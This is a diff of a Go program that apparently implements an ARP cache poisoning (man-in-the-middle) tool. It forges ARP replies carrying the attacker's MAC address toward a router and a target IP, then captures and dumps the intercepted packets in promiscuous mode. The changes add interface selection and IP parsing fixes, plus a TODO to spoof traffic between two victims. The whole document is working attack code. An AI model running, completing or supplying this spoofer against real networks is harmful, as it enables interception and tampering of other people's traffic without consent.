@@ -111,6 +111,7 @@ func mapIPstoMAC(ips ...string) (*IPtoMAC, error) {
 	return ipToMAC, nil
 }
 
+// TODO: loop through both victim's info, and spoof the ip of victim 1 as src, and victim 2's ip as dst, and vice versa
 func poisonARPCache(deviceInfo *IPtoMAC, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
 	for ipStr, vicMACStr := range deviceInfo.IPtoMAC {
 		// build the layers
@@ -119,6 +120,8 @@ func poisonARPCache(deviceInfo *IPtoMAC, attackerInfo *AttackerInfo, deviceHandl
 		if err != nil {
 			return err
 		}
+
+		ip := layers.IPv4{}
 
 		eth := layers.Ethernet{
 			SrcMAC:       attackerInfo.MAC,
@@ -133,7 +136,7 @@ func poisonARPCache(deviceInfo *IPtoMAC, attackerInfo *AttackerInfo, deviceHandl
 			ProtAddressSize:   4,
 			Operation:         layers.ARPReply,
 			SourceHwAddress:   attackerInfo.MAC,
-			SourceProtAddress: attackerInfo.IP.IP,
+			SourceProtAddress: attackerInfo.IP,
 			DstHwAddress:      vicMAC,
 			DstProtAddress:    net.ParseIP(ipStr),
 		}
@@ -159,25 +162,47 @@ func poisonARPCache(deviceInfo *IPtoMAC, attackerInfo *AttackerInfo, deviceHandl
 
 type AttackerInfo struct {
 	MAC net.HardwareAddr
-	IP  *net.IPAddr
+	IP  net.IP
 }
 
-func getDevice() (*net.Interface, error) {
-	ifaces, err := net.Interfaces()
+func getDevice(ifaceArg string) (string, error) {
+	devices, err := pcap.FindAllDevs()
 	if err != nil {
-		return nil, err
+		return "", err
 	}
 
-	for _, iface := range ifaces {
-		if iface.Name == "Wi-Fi" {
-			return &iface, nil
+	devToAddrs := make(map[string][]pcap.InterfaceAddress)
+
+	for _, device := range devices {
+		devToAddrs[device.Name] = device.Addresses
+	}
+
+	iface, err := net.InterfaceByName(ifaceArg)
+	if err != nil {
+		return "", err
+	}
+
+	addrs, err := iface.Addrs()
+	if err != nil {
+		return "", err
+	}
+
+	for nameKey, addrsVal := range devToAddrs {
+		for _, devAddr := range addrsVal {
+			for _, addr := range addrs {
+				if devAddr.IP.To4() != nil {
+					if strings.Contains(addr.String(), devAddr.IP.String()) {
+						return nameKey, nil
+					}
+				}
+			}
 		}
 	}
 
-	return nil, errors.New("failed to find appropriate interface")
+	return "", errors.New("failed to find appropriate interface")
 }
 
-func getAttackerInfo() (*AttackerInfo, error) {
+func getAttackerInfo(ifaceArg string) (*AttackerInfo, error) {
 	ifaces, err := net.Interfaces()
 	if err != nil {
 		return nil, err
@@ -185,7 +210,7 @@ func getAttackerInfo() (*AttackerInfo, error) {
 
 	var info AttackerInfo
 	for _, iface := range ifaces {
-		if iface.Name == "Wi-Fi" {
+		if iface.Name == ifaceArg {
 			info.MAC = iface.HardwareAddr
 			addrs, err := iface.Addrs()
 			if err != nil {
@@ -193,13 +218,21 @@ func getAttackerInfo() (*AttackerInfo, error) {
 			}
 
 			for _, ip := range addrs {
-				ipnet, ok := ip.(*net.IPAddr)
-				if ok {
-					info.IP = ipnet
-					break
+				idx := strings.Index(ip.String(), "/")
+				parsed := net.ParseIP(ip.String()[:idx])
+				if parsed == nil {
+					return nil, errors.New("failed to parse ip")
 				}
+				if parsed.To4() == nil {
+					continue
+				}
+				info.IP = parsed
 			}
 		}
+	}
+
+	if info.IP == nil {
+		return nil, errors.New("failed to obtain attacker's ip address")
 	}
 
 	return &info, nil
@@ -210,39 +243,39 @@ func readPackets(deviceHandle *pcap.Handle) error {
 	packetSource := gopacket.NewPacketSource(deviceHandle, deviceHandle.LinkType())
 
 	for packet := range packetSource.Packets() {
-
+		fmt.Println(packet.Dump())
 	}
 
 	return nil
 }
 
 func main() {
-	if len(os.Args) != 3 {
-		fmt.Println("usage: <router ip> <target ip>")
+	if len(os.Args) != 4 {
+		fmt.Println("usage: <interface> <router ip> <target ip>")
 		os.Exit(0)
 	}
 
-	if err := checkIPs(os.Args[1], os.Args[2]); err != nil {
+	if err := checkIPs(os.Args[2], os.Args[3]); err != nil {
 		log.Fatal(err)
 	}
 
-	attackerInfo, err := getAttackerInfo()
+	attackerInfo, err := getAttackerInfo(os.Args[1])
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	device, err := getDevice()
+	device, err := getDevice(os.Args[1])
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	deviceHandle, err := pcap.OpenLive(device.Name, 65536, true, pcap.BlockForever)
+	deviceHandle, err := pcap.OpenLive(device, 65536, true, pcap.BlockForever)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer deviceHandle.Close()
 
-	IPtoMAC, err := mapIPstoMAC(os.Args[1], os.Args[2])
+	IPtoMAC, err := mapIPstoMAC(os.Args[2], os.Args[3])
 	if err != nil {
 		log.Fatal(err)
 	}
